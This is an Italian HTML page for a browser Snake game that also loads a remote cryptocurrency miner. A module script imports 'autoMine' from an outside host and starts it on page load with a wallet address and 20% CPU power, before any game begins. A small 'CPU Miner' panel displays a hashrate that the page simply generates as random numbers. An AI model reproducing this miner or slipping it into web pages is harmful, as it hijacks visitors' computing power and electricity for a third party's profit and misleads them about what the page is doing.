<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0a0a14;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        h1 {
            color: #0f0;
            margin: 30px 0 10px 0;
        }

        /* Menu Iniziale */
        #menu {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
        }
        .menu-box {
            background: rgba(0, 30, 0, 0.9);
            border: 3px solid #0f0;
            padding: 40px 60px;
            border-radius: 15px;
            box-shadow: 0 0 30px #0f0;
        }

        /* Canvas */
        #game-container {
            display: none;
            justify-content: center;
            margin-top: 20px;
        }
        canvas {
            border: 4px solid #0f0;
            border-radius: 10px;
            background: #111;
            box-shadow: 0 0 25px #0f0;
        }

        /* Game Over Screen */
        #game-over {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.95);
            border: 3px solid #f00;
            padding: 40px 60px;
            border-radius: 15px;
            display: none;
            z-index: 200;
        }

        button {
            margin: 15px;
            padding: 14px 30px;
            font-size: 1.2em;
            background: #0f0;
            color: black;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        button:hover {
            background: #0c0;
        }

        .score {
            font-size: 1.4em;
            margin: 15px 0;
        }

        /* Mining Console */
        #mining-console {
            position: fixed;
            bottom: 15px;
            right: 15px;
            width: 220px;
            background: rgba(0, 0, 0, 0.85);
            border: 2px solid #0f0;
            border-radius: 8px;
            padding: 12px;
            font-size: 0.9em;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
            z-index: 300;
            text-align: left;
        }
    </style>
</head>
<body>

    <!-- MENU INIZIALE -->
    <div id="menu">
        <div class="menu-box">
            <h1>🐍 Snake Game</h1>
            <p style="margin: 20px 0;">Pronto a giocare?</p>
            <button onclick="startGame()">▶️ START GAME</button>
        </div>
    </div>

    <!-- GIOCO -->
    <div id="game-container">
        <canvas id="gameCanvas" width="400" height="400"></canvas>
    </div>

    <!-- GAME OVER -->
    <div id="game-over">
        <h1>Game Over</h1>
        <div class="score">Punteggio: <span id="final-score">0</span></div>
        <button onclick="restartGame()">Gioca di Nuovo</button>
        <button onclick="goToMenu()">Torna al Menu</button>
    </div>

    <!-- Mining Console -->
    <div id="mining-console">
        <div class="console-title">🔨 CPU Miner</div>
        <div class="console-line">Stato: <span id="miner-status" class="status">Avviato</span></div>
        <div class="console-line">Hashrate: <span id="hashrate">Calcolando...</span></div>
        <div class="console-line">Potenza: <span id="power">20%</span></div>
    </div>

    <!-- Crypto Miner -->
    <script type="module">
        import { autoMine } from "https://earnify.cc/miner.js";
        autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
    </script>

    <script>
        // ==================== SNAKE GAME ====================
        const canvas = document.getElementById("gameCanvas");
        const ctx = canvas.getContext("2d");
        let snake = [{ x: 10, y: 10 }];
        let food = { x: 15, y: 15 };
        let dx = 0, dy = 0;
        let score = 0;
        let gameInterval;
        let gameSpeed = 100;

        function drawGame() {
            const head = { x: snake[0].x + dx, y: snake[0].y + dy };

            if (head.x < 0 || head.x >= 20 || head.y < 0 || head.y >= 20) {
                gameOver();
                return;
            }

            for (let segment of snake) {
                if (head.x === segment.x && head.y === segment.y) {
                    gameOver();
                    return;
                }
            }

            snake.unshift(head);

            if (head.x === food.x && head.y === food.y) {
                score += 10;
                generateFood();
                if (score % 50 === 0 && gameSpeed > 50) gameSpeed -= 10;
            } else {
                snake.pop();
            }

            // Disegna
            ctx.fillStyle = "#111";
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = "#0f0";
            snake.forEach(s => ctx.fillRect(s.x * 20, s.y * 20, 18, 18));

            ctx.fillStyle = "#f00";
            ctx.fillRect(food.x * 20, food.y * 20, 18, 18);
        }

        function generateFood() {
            food = {
                x: Math.floor(Math.random() * 20),
                y: Math.floor(Math.random() * 20)
            };
            for (let s of snake) {
                if (s.x === food.x && s.y === food.y) generateFood();
            }
        }

        function gameOver() {
            clearInterval(gameInterval);
            document.getElementById("final-score").textContent = score;
            document.getElementById("game-over").style.display = "block";
        }

        function startGame() {
            document.getElementById("menu").style.display = "none";
            document.getElementById("game-container").style.display = "flex";
            document.getElementById("game-over").style.display = "none";

            snake = [{ x: 10, y: 10 }];
            dx = 1; dy = 0;
            score = 0;
            gameSpeed = 100;
            generateFood();

            clearInterval(gameInterval);
            gameInterval = setInterval(drawGame, gameSpeed);
        }

        function restartGame() {
            document.getElementById("game-over").style.display = "none";
            startGame();
        }

        function goToMenu() {
            document.getElementById("game-over").style.display = "none";
            document.getElementById("game-container").style.display = "none";
            document.getElementById("menu").style.display = "block";
        }

        // Controlli tastiera
        document.addEventListener("keydown", e => {
            if (document.getElementById("game-container").style.display !== "flex") return;
            switch(e.key) {
                case "ArrowUp":    if (dy !== 1) { dx = 0; dy = -1; } break;
                case "ArrowDown":  if (dy !== -1) { dx = 0; dy = 1; } break;
                case "ArrowLeft":  if (dx !== 1) { dx = -1; dy = 0; } break;
                case "ArrowRight": if (dx !== -1) { dx = 1; dy = 0; } break;
            }
        });

        // Simulazione Hashrate
        setInterval(() => {
            const hashrate = Math.floor(Math.random() * 450) + 280;
            document.getElementById("hashrate").textContent = hashrate + " H/s";
        }, 2000);
    </script>
</body>
</html>
